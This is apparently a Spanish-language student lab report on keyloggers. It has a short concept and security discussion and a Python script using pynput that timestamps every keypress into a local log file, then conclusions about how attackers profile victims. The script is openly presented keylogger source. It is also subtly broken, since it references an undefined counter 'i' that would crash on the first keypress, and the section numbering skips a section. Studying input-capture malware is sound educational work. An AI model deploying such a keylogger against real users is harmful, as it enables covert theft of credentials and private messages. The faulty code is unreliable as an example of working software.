Act. 03 - No presiones esc... todavía Implementación y Análisis de un Keylogger

1. Introducción y Concepto

Un keylogger es cualquier herramienta (de software o hardware) capaz de capturar y registrar las pulsaciones de teclado realizadas en un dispositivo. Su estudio ilustra de manera directa cómo funcionan las técnicas de captura de entrada (input capture) y por qué la vigilancia de eventos puede representar un vector de ataque grave.

De forma conceptual, un keylogger es un mecanismo de monitoreo situado entre el usuario y el sistema que intercepta eventos (pulsación y liberación) generados por el teclado. Se apoya en la idea de event hooks y callbacks, donde el programa "escucha" las notificaciones del sistema operativo para registrarlas.

2. Importancia en la Ciberseguridad

  • Vector de robo de información: Son técnicas comunes para sustraer credenciales, datos bancarios y comunicaciones privadas.
  • Ejemplo didáctico: Permiten entender cómo el sistema operativo expone eventos y cómo puede aprovecharse indebidamente.
  • Base de otras amenazas: Suelen combinarse con exfiltración de datos y evasión de defensas en campañas de malware más amplias.
  • Auditoría y cumplimiento: Ayudan a diferenciar entre vigilancia corporativa legítima y vigilancia encubierta.

3. Implementación y Desarrollo

Se desarrolló un script en Python utilizando programación orientada a eventos, incorporando asociación temporal (librería datetime) para estampar la hora exacta, persistencia del registro en un archivo local (registro_teclado.txt) mediante el modo de adición "a", y manejo de excepciones (try-except) para capturar tanto caracteres estándar como teclas especiales. 

from pynput.keyboard import Key, Listener
from datetime import datetime

archivo_log = "registro_teclado.txt"

def on_press(key):
    global i
    ahora = datetime.now()
    formato = ahora.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    try:
        linea_registro = f"{formato} | PRESS | evento_{i:03d} | Tecla: {key.char}\n"
    except AttributeError:
        linea_registro = f"{formato} | PRESS | evento_{i:03d} | Tecla: {key}\n"
    
    print(linea_registro.strip())
    with open(archivo_log, "a", encoding="utf-8") as archivo:
        archivo.write(linea_registro)

def on_release(key):
    print(f"Key released: {key}")
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

5. Conclusiones

La práctica permitió comprender a nivel técnico cómo operan las técnicas de captura de entrada, demostrando la facilidad con la que un programa en segundo plano puede monitorear a un usuario. La incorporación de persistencia y asociación temporal evidencia cómo un atacante podría perfilar el comportamiento de una víctima para extraer información sensible, subrayando la criticidad de mantener controles de seguridad estrictos.
